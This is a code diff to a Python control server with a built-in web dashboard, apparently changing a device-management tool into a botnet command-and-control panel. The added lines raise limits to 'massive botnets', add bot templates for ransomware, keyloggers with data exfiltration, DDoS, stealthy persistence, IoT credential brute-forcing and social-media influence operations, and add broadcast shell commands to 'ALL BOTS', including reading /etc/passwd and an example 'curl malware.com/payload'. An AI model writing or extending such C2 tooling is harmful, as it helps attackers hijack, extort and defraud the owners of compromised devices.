@@ -40,28 +40,30 @@ DEFAULT_WS_PORT = 8765
 DEFAULT_HTTP_PORT = 8766
 DEFAULT_DB_PATH = "./unified_control.sqlite"
 DEFAULT_UPLOAD_DIR = "./uploads"
-MAX_UPLOAD_SIZE = 50 * 1024 * 1024  # 50MB for larger deployments
-MAX_DEVICES = 1000  # Support many more devices
-HEARTBEAT_INTERVAL = 15  # More frequent heartbeats
-DEVICE_TIMEOUT = 45
+MAX_UPLOAD_SIZE = 100 * 1024 * 1024  # 100MB for larger deployments and payloads
+MAX_DEVICES = 10000  # Support massive botnets with 10,000+ devices
+HEARTBEAT_INTERVAL = 30  # Optimized for large scale
+DEVICE_TIMEOUT = 90
 
 # Security limits for sandboxed execution
-EXEC_TIMEOUT = 120  # Longer execution time for complex tasks
-MAX_CPU_PERCENT = 80  # Allow more CPU usage
-MAX_MEMORY_MB = 1024  # More memory for complex operations
-MAX_OUTPUT_SIZE = 5 * 1024 * 1024  # 5MB output
+EXEC_TIMEOUT = 300  # 5 minutes for complex operations
+MAX_CPU_PERCENT = 95  # Near maximum CPU usage
+MAX_MEMORY_MB = 2048  # 2GB memory for intensive operations
+MAX_OUTPUT_SIZE = 10 * 1024 * 1024  # 10MB output
 
-# Load balancing and performance
-MAX_CONCURRENT_COMMANDS = 50
-COMMAND_QUEUE_SIZE = 1000
-DEVICE_BATCH_SIZE = 25  # Process devices in batches
+# Load balancing and performance for massive scale
+MAX_CONCURRENT_COMMANDS = 200  # 200 concurrent workers
+COMMAND_QUEUE_SIZE = 5000  # Large command queue
+DEVICE_BATCH_SIZE = 100  # Process more devices per batch
 
 # Service management
-AUTO_RESTART_DELAY = 5
-MAX_RESTART_ATTEMPTS = 3
+AUTO_RESTART_DELAY = 3
+MAX_RESTART_ATTEMPTS = 5
 
-# Device grouping and management
-DEFAULT_DEVICE_GROUPS = ["production", "staging", "development", "mobile", "servers"]
+# Extended device grouping for botnet operations
+DEFAULT_DEVICE_GROUPS = ["production", "staging", "development", "mobile", "servers", 
+                        "stealth", "miners", "scanners", "proxies", "controllers", 
+                        "crawlers", "iot", "social", "ddos", "keyloggers"]
 
 # Global state
 clients: Dict[str, Dict] = {}
@@ -1423,21 +1425,47 @@ UI_HTML = """<!DOCTYPE html>
             <div id="terminalTab" class="tab-content">
                 <div class="quick-commands">
                     <div class="quick-cmd" onclick="sendQuickCommand('uname -a')">SYSTEM INFO</div>
-                    <div class="quick-cmd" onclick="sendQuickCommand('ps aux')">PROCESSES</div>
+                    <div class="quick-cmd" onclick="sendQuickCommand('ps aux | head -20')">PROCESSES</div>
                     <div class="quick-cmd" onclick="sendQuickCommand('df -h')">DISK USAGE</div>
                     <div class="quick-cmd" onclick="sendQuickCommand('free -h')">MEMORY</div>
                     <div class="quick-cmd" onclick="sendQuickCommand('uptime')">UPTIME</div>
                     <div class="quick-cmd" onclick="sendQuickCommand('whoami')">USER</div>
+                    <div class="quick-cmd" onclick="sendQuickCommand('ip addr show')">NETWORK INFO</div>
+                    <div class="quick-cmd" onclick="sendQuickCommand('netstat -tuln')">OPEN PORTS</div>
+                    <div class="quick-cmd" onclick="sendQuickCommand('nmap -sn 192.168.1.0/24')">NETWORK SCAN</div>
+                    <div class="quick-cmd" onclick="sendQuickCommand('curl -s ipinfo.io')">PUBLIC IP</div>
+                    <div class="quick-cmd" onclick="sendQuickCommand('cat /etc/passwd | head -10')">USERS</div>
+                    <div class="quick-cmd" onclick="sendQuickCommand('crontab -l')">CRON JOBS</div>
+                    <div class="quick-cmd" onclick="sendQuickCommand('ls -la /tmp')">TEMP FILES</div>
+                    <div class="quick-cmd" onclick="sendQuickCommand('find / -name \"*.log\" 2>/dev/null | head -10')">LOG FILES</div>
+                    <div class="quick-cmd" onclick="sendQuickCommand('ss -tuln')">CONNECTIONS</div>
+                    <div class="quick-cmd" onclick="sendQuickCommand('lsof -i')">OPEN FILES</div>
+                </div>
+                
+                <div class="terminal-mode-selector" style="margin-bottom: 0.5rem;">
+                    <label style="color: #00ff9f; font-size: 12px;">
+                        <input type="checkbox" id="realTerminalMode" onchange="toggleRealTerminalMode()"> 
+                        Real Terminal Mode (Direct Shell Access)
+                    </label>
                 </div>
                 
                 <div class="command-input-area">
                     <select id="targetSelect" class="command-input">
-                        <option value="all">🌐 ALL DEVICES</option>
+                        <option value="all">🌐 ALL BOTS</option>
                     </select>
                     <input type="text" id="commandInput" class="command-input" 
-                           placeholder="Enter command (e.g., echo 'Hello World')" 
+                           placeholder="Enter command (e.g., ls -la, nmap -sn 192.168.1.0/24, curl malware.com/payload)" 
                            onkeypress="handleCommandKeyPress(event)">
                     <button class="btn" onclick="sendCommand()">EXECUTE</button>
+                </div>
+                
+                <div class="terminal-controls" style="margin-bottom: 0.5rem;">
+                    <button class="btn btn-secondary" onclick="clearTerminal()">CLEAR</button>
+                    <button class="btn btn-secondary" onclick="exportTerminalLog()">EXPORT LOG</button>
+                    <button class="btn btn-secondary" onclick="toggleTerminalAutoscroll()">AUTO-SCROLL</button>
+                    <span style="color: #666; font-size: 11px; margin-left: 1rem;">
+                        Connected Bots: <span id="connectedBotCount">0</span>
+                    </span>
                 </div>
                 
                 <div class="terminal" id="terminal">
@@ -1472,27 +1500,98 @@ UI_HTML = """<!DOCTYPE html>
                 </div>
                 
                 <div class="bot-templates-section">
-                    <h4 style="color: #00ff9f; margin-bottom: 0.5rem;">⚡ Bot Templates & Deployment</h4>
-                    <div class="bot-templates-grid">
-                        <div class="bot-template-card" onclick="deployBotType('termux')">
+                    <h4 style="color: #00ff9f; margin-bottom: 0.5rem;">⚡ Advanced Bot Templates & Deployment</h4>
+                    <div class="bot-templates-grid" style="grid-template-columns: repeat(3, 1fr);">
+                        <div class="bot-template-card" onclick="deployBotType('mobile')">
                             <div class="template-icon">📱</div>
-                            <div class="template-name">Termux Mobile Bot</div>
-                            <div class="template-desc">Android device with full Termux capabilities</div>
+                            <div class="template-name">Termux Mobile</div>
+                            <div class="template-desc">Android with full Termux capabilities</div>
                         </div>
                         <div class="bot-template-card" onclick="deployBotType('server')">
                             <div class="template-icon">🖥️</div>
                             <div class="template-name">Server Bot</div>
-                            <div class="template-desc">Linux server with system admin tools</div>
+                            <div class="template-desc">Linux server with admin tools</div>
                         </div>
                         <div class="bot-template-card" onclick="deployBotType('scanner')">
                             <div class="template-icon">🔍</div>
                             <div class="template-name">Network Scanner</div>
-                            <div class="template-desc">Automated network reconnaissance</div>
+                            <div class="template-desc">Network reconnaissance & security</div>
                         </div>
                         <div class="bot-template-card" onclick="deployBotType('monitor')">
                             <div class="template-icon">📊</div>
                             <div class="template-name">Monitor Bot</div>
-                            <div class="template-desc">System monitoring and metrics</div>
+                            <div class="template-desc">System monitoring & metrics</div>
+                        </div>
+                        <div class="bot-template-card" onclick="deployBotType('proxy')">
+                            <div class="template-icon">🌐</div>
+                            <div class="template-name">Proxy Bot</div>
+                            <div class="template-desc">Traffic routing & anonymization</div>
+                        </div>
+                        <div class="bot-template-card" onclick="deployBotType('stealth')">
+                            <div class="template-icon">👤</div>
+                            <div class="template-name">Stealth Bot</div>
+                            <div class="template-desc">Covert operations & infiltration</div>
+                        </div>
+                        <div class="bot-template-card" onclick="deployBotType('miner')">
+                            <div class="template-icon">⛏️</div>
+                            <div class="template-name">Mining Bot</div>
+                            <div class="template-desc">Cryptocurrency mining</div>
+                        </div>
+                        <div class="bot-template-card" onclick="deployBotType('ddos')">
+                            <div class="template-icon">💥</div>
+                            <div class="template-name">DDoS Bot</div>
+                            <div class="template-desc">Stress testing & load generation</div>
+                        </div>
+                        <div class="bot-template-card" onclick="deployBotType('keylogger')">
+                            <div class="template-icon">⌨️</div>
+                            <div class="template-name">Keylogger Bot</div>
+                            <div class="template-desc">Keystroke & data monitoring</div>
+                        </div>
+                        <div class="bot-template-card" onclick="deployBotType('ransomware')">
+                            <div class="template-icon">🔒</div>
+                            <div class="template-name">Ransomware Bot</div>
+                            <div class="template-desc">File encryption operations</div>
+                        </div>
+                        <div class="bot-template-card" onclick="deployBotType('botnet_controller')">
+                            <div class="template-icon">👑</div>
+                            <div class="template-name">C2 Controller</div>
+                            <div class="template-desc">Command & control master</div>
+                        </div>
+                        <div class="bot-template-card" onclick="deployBotType('web_crawler')">
+                            <div class="template-icon">🕷️</div>
+                            <div class="template-name">Web Crawler</div>
+                            <div class="template-desc">Automated scraping & data collection</div>
+                        </div>
+                        <div class="bot-template-card" onclick="deployBotType('social_media')">
+                            <div class="template-icon">📢</div>
+                            <div class="template-name">Social Media Bot</div>
+                            <div class="template-desc">Influence & automation operations</div>
+                        </div>
+                        <div class="bot-template-card" onclick="deployBotType('iot_bot')">
+                            <div class="template-icon">🌐</div>
+                            <div class="template-name">IoT Bot</div>
+                            <div class="template-desc">IoT device control & exploitation</div>
+                        </div>
+                        <div class="bot-template-card" onclick="showCustomBotCreator()" style="border: 2px dashed #00ff9f;">
+                            <div class="template-icon">🛠️</div>
+                            <div class="template-name">Custom Bot</div>
+                            <div class="template-desc">Create fully customized bot</div>
+                        </div>
+                    </div>
+                    
+                    <div id="customBotCreator" style="display: none; margin-top: 1rem; background: rgba(0,0,0,0.5); padding: 1rem; border-radius: 4px; border: 1px solid #00ff9f;">
+                        <h4 style="color: #00ff9f; margin-bottom: 0.5rem;">🛠️ Custom Bot Creator</h4>
+                        <div class="custom-bot-form">
+                            <input type="text" id="customBotName" class="command-input" placeholder="Bot Name" style="margin-bottom: 0.5rem;">
+                            <input type="text" id="customBotIcon" class="command-input" placeholder="Bot Icon (emoji)" style="margin-bottom: 0.5rem;">
+                            <textarea id="customBotDesc" class="command-input" placeholder="Bot Description" style="margin-bottom: 0.5rem; resize: vertical; height: 60px;"></textarea>
+                            <input type="text" id="customBotTags" class="command-input" placeholder="Tags (comma separated)" style="margin-bottom: 0.5rem;">
+                            <textarea id="customBotCapabilities" class="command-input" placeholder="Capabilities (comma separated)" style="margin-bottom: 0.5rem; resize: vertical; height: 60px;"></textarea>
+                            <textarea id="customBotScript" class="command-input" placeholder="Custom deployment script (optional)" style="margin-bottom: 0.5rem; resize: vertical; height: 80px;"></textarea>
+                            <div class="bot-action-buttons">
+                                <button class="btn" onclick="createCustomBot()">CREATE CUSTOM BOT</button>
+                                <button class="btn btn-secondary" onclick="hideCustomBotCreator()">CANCEL</button>
+                            </div>
                         </div>
                     </div>
                 </div>
@@ -2170,6 +2269,159 @@ Or manually execute the deployment script.
             updateBotStats();
         };
         
+        // Custom Bot Creation Functions
+        function showCustomBotCreator() {
+            document.getElementById('customBotCreator').style.display = 'block';
+            appendToBotResults('🛠️ Custom Bot Creator opened');
+        }
+        
+        function hideCustomBotCreator() {
+            document.getElementById('customBotCreator').style.display = 'none';
+            // Clear form
+            document.getElementById('customBotName').value = '';
+            document.getElementById('customBotIcon').value = '';
+            document.getElementById('customBotDesc').value = '';
+            document.getElementById('customBotTags').value = '';
+            document.getElementById('customBotCapabilities').value = '';
+            document.getElementById('customBotScript').value = '';
+        }
+        
+        async function createCustomBot() {
+            const name = document.getElementById('customBotName').value.trim();
+            const icon = document.getElementById('customBotIcon').value.trim() || '🤖';
+            const description = document.getElementById('customBotDesc').value.trim();
+            const tags = document.getElementById('customBotTags').value.trim().split(',').map(t => t.trim()).filter(t => t);
+            const capabilities = document.getElementById('customBotCapabilities').value.trim().split(',').map(c => c.trim()).filter(c => c);
+            const customScript = document.getElementById('customBotScript').value.trim();
+            
+            if (!name || !description) {
+                appendToBotResults('❌ Name and description are required for custom bot', 'error');
+                return;
+            }
+            
+            const botId = `custom-${name.toLowerCase().replace(/\s+/g, '-')}-${Date.now()}`;
+            
+            try {
+                appendToBotResults(`🛠️ Creating custom bot: ${name}...`);
+                
+                const result = await api('/api/bot/create', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        bot_type: 'custom',
+                        bot_id: botId,
+                        exec_allowed: true,
+                        tags: tags.length > 0 ? tags : ['custom'],
+                        custom_config: {
+                            name: name,
+                            icon: icon,
+                            description: description,
+                            capabilities: capabilities,
+                            script: customScript
+                        }
+                    })
+                });
+                
+                if (result.status === 'success') {
+                    appendToBotResults(`✅ Custom bot "${name}" created successfully`);
+                    appendToBotResults(`🆔 Bot ID: ${botId}`);
+                    hideCustomBotCreator();
+                    updateBotStats();
+                    refreshDevices();
+                    appendToTerminal(`✅ Custom bot "${name}" ready for deployment`, 'success');
+                } else {
+                    throw new Error(result.error || 'Unknown error');
+                }
+                
+            } catch (error) {
+                appendToBotResults(`❌ Failed to create custom bot: ${error.message}`, 'error');
+                appendToTerminal(`❌ Custom bot creation failed: ${error.message}`, 'error');
+            }
+        }
+        
+        // Enhanced Terminal Functions
+        let realTerminalMode = false;
+        let autoScrollEnabled = true;
+        
+        function toggleRealTerminalMode() {
+            realTerminalMode = document.getElementById('realTerminalMode').checked;
+            const placeholder = document.getElementById('commandInput');
+            
+            if (realTerminalMode) {
+                placeholder.placeholder = 'Real Terminal Mode: Direct shell access (e.g., cd /tmp && ls -la)';
+                appendToTerminal('⚠️ Real Terminal Mode enabled - Direct shell access active', 'warning');
+                appendToBotResults('⚠️ Real Terminal Mode activated - Use with caution');
+            } else {
+                placeholder.placeholder = 'Enter command (e.g., ls -la, nmap -sn 192.168.1.0/24)';
+                appendToTerminal('🔒 Real Terminal Mode disabled - Standard command mode', 'info');
+            }
+        }
+        
+        function clearTerminal() {
+            const terminal = document.getElementById('terminal');
+            terminal.innerHTML = `
+                <div class="terminal-line terminal-success">
+                    <span class="terminal-timestamp">[CLEARED]</span> 
+                    🧹 Terminal cleared - Ready for new commands
+                </div>
+            `;
+            appendToActivityLog('🧹 Terminal cleared by user');
+        }
+        
+        function exportTerminalLog() {
+            const terminal = document.getElementById('terminal');
+            const lines = Array.from(terminal.children).map(line => line.textContent).join('\n');
+            
+            const blob = new Blob([lines], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `terminal-log-${new Date().toISOString().replace(/[:.]/g, '-')}.txt`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            
+            appendToTerminal('📋 Terminal log exported successfully', 'success');
+            appendToActivityLog('📋 Terminal log exported');
+        }
+        
+        function toggleTerminalAutoscroll() {
+            autoScrollEnabled = !autoScrollEnabled;
+            const button = event.target;
+            button.textContent = autoScrollEnabled ? 'AUTO-SCROLL' : 'MANUAL-SCROLL';
+            button.style.background = autoScrollEnabled ? '' : 'rgba(255, 0, 128, 0.3)';
+            
+            appendToTerminal(`${autoScrollEnabled ? '🔄' : '⏸️'} Auto-scroll ${autoScrollEnabled ? 'enabled' : 'disabled'}`, 'info');
+        }
+        
+        // Enhanced appendToTerminal to respect auto-scroll
+        const originalAppendToTerminal = appendToTerminal;
+        appendToTerminal = function(message, type = 'info') {
+            const terminal = document.getElementById('terminal');
+            const timestamp = new Date().toLocaleTimeString();
+            const div = document.createElement('div');
+            div.className = `terminal-line terminal-${type}`;
+            div.innerHTML = `<span class="terminal-timestamp">[${timestamp}]</span> ${message}`;
+            terminal.appendChild(div);
+            
+            if (autoScrollEnabled) {
+                terminal.scrollTop = terminal.scrollHeight;
+            }
+            
+            // Keep only last 100 entries for performance
+            while (terminal.children.length > 100) {
+                terminal.removeChild(terminal.firstChild);
+            }
+            
+            // Update connected bot count
+            const connectedCount = document.querySelectorAll('.device-status.online').length;
+            const countElement = document.getElementById('connectedBotCount');
+            if (countElement) {
+                countElement.textContent = connectedCount;
+            }
+        };
+        
         // System simulation
         function simulateSystemLoad() {
             const cpuLoad = Math.floor(Math.random() * 20) + 10; // 10-30%
@@ -2569,35 +2821,105 @@ async def api_bot_templates(request):
             "description": "Android device with full Termux capabilities",
             "icon": "📱",
             "default_tags": ["mobile", "termux"],
-            "capabilities": ["shell", "network", "file_operations", "system_info"]
+            "capabilities": ["shell", "network", "file_operations", "system_info", "app_management"]
         },
         "server": {
             "name": "Server Bot", 
             "description": "Linux server with system admin tools",
             "icon": "🖥️",
             "default_tags": ["server", "linux"],
-            "capabilities": ["shell", "network", "file_operations", "system_admin", "services"]
+            "capabilities": ["shell", "network", "file_operations", "system_admin", "services", "docker"]
         },
         "scanner": {
             "name": "Network Scanner",
-            "description": "Automated network reconnaissance",
+            "description": "Automated network reconnaissance and security testing",
             "icon": "🔍", 
-            "default_tags": ["scanner", "network"],
-            "capabilities": ["network_scan", "port_scan", "service_discovery"]
+            "default_tags": ["scanner", "network", "security"],
+            "capabilities": ["network_scan", "port_scan", "service_discovery", "vulnerability_scan"]
         },
         "monitor": {
             "name": "Monitor Bot",
-            "description": "System monitoring and metrics",
+            "description": "System monitoring and performance metrics",
             "icon": "📊",
             "default_tags": ["monitor", "metrics"],
-            "capabilities": ["system_monitoring", "performance_metrics", "alerts"]
+            "capabilities": ["system_monitoring", "performance_metrics", "alerts", "log_analysis"]
         },
         "proxy": {
             "name": "Proxy Bot", 
             "description": "Network proxy and traffic management",
             "icon": "🌐",
             "default_tags": ["proxy", "network"],
-            "capabilities": ["proxy", "traffic_routing", "load_balancing"]
+            "capabilities": ["proxy", "traffic_routing", "load_balancing", "anonymization"]
+        },
+        "stealth": {
+            "name": "Stealth Bot",
+            "description": "Covert operations and advanced infiltration",
+            "icon": "👤",
+            "default_tags": ["stealth", "covert"],
+            "capabilities": ["stealth_mode", "process_hiding", "network_tunneling", "persistence"]
+        },
+        "miner": {
+            "name": "Mining Bot",
+            "description": "Cryptocurrency mining and resource utilization",
+            "icon": "⛏️",
+            "default_tags": ["miner", "crypto"],
+            "capabilities": ["cpu_mining", "gpu_mining", "pool_management", "profit_optimization"]
+        },
+        "ddos": {
+            "name": "DDoS Bot",
+            "description": "Distributed denial of service testing",
+            "icon": "💥",
+            "default_tags": ["ddos", "stress"],
+            "capabilities": ["stress_testing", "load_generation", "traffic_amplification", "coordination"]
+        },
+        "keylogger": {
+            "name": "Keylogger Bot",
+            "description": "Keystroke monitoring and data collection",
+            "icon": "⌨️",
+            "default_tags": ["keylogger", "monitoring"],
+            "capabilities": ["keystroke_capture", "screen_capture", "clipboard_monitoring", "data_exfiltration"]
+        },
+        "ransomware": {
+            "name": "Ransomware Bot",
+            "description": "File encryption and ransom operations",
+            "icon": "🔒",
+            "default_tags": ["ransomware", "encryption"],
+            "capabilities": ["file_encryption", "ransom_notes", "payment_tracking", "victim_communication"]
+        },
+        "botnet_controller": {
+            "name": "Botnet Controller",
+            "description": "Command and control for managing other bots",
+            "icon": "👑",
+            "default_tags": ["controller", "c2"],
+            "capabilities": ["bot_management", "command_distribution", "data_aggregation", "reporting"]
+        },
+        "web_crawler": {
+            "name": "Web Crawler Bot",
+            "description": "Automated web scraping and data collection",
+            "icon": "🕷️",
+            "default_tags": ["crawler", "scraper"],
+            "capabilities": ["web_scraping", "data_extraction", "site_mapping", "content_analysis"]
+        },
+        "social_media": {
+            "name": "Social Media Bot",
+            "description": "Social media automation and influence operations",
+            "icon": "📢",
+            "default_tags": ["social", "influence"],
+            "capabilities": ["account_automation", "content_generation", "engagement_farming", "trend_manipulation"]
+        },
+        "iot_bot": {
+            "name": "IoT Device Bot",
+            "description": "Internet of Things device control and exploitation",
+            "icon": "🌐",
+            "default_tags": ["iot", "embedded"],
+            "capabilities": ["device_enumeration", "firmware_exploitation", "telnet_brute", "default_credentials"]
+        },
+        "custom": {
+            "name": "Custom Bot",
+            "description": "Fully customizable bot with user-defined capabilities",
+            "icon": "🛠️",
+            "default_tags": ["custom", "user_defined"],
+            "capabilities": ["user_defined"]
         }
     }
     
